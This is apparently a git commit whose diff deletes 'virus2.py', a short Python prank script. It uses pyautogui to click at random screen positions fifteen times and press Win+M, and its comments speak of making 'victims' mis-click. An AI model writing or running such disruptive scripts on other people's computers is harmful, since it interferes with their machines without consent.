4431e6ae38efb8e73eaf76b9611c564843307b52
phoenixyork166 <berlinlee2017@gmail.com>
2024-01-28 21:39:19 +0800

    mouse left mis-clicking...

--- virus2.py
+++
@@ -1,8 +0,0 @@
-import random, pyautogui as pyauto
-for i in range(15):
-    height = random.randint(0, 1080)
-    width = random.randint(0, 1920)
-    # auto click using Desktop resolution every 0.3s
-    pyauto.click(height, width, duration = 0.3)
-    # Making victims accidentally mouse left click all the time
-    pyauto.hotkey('winleft', 'm')
